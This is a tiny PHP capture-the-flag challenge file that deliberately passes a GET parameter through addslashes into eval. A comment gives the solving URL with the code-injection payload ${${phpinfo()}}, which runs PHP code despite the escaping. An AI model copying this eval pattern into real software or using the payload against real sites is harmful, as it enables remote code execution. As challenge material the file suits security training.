<?php 
#GOAL: gather some phpinfo();
   
$str=@(string)$_GET['str'];
eval('$str="'.addslashes($str).'";');

//http://nitectf.com/index.php?str=${${phpinfo()}} 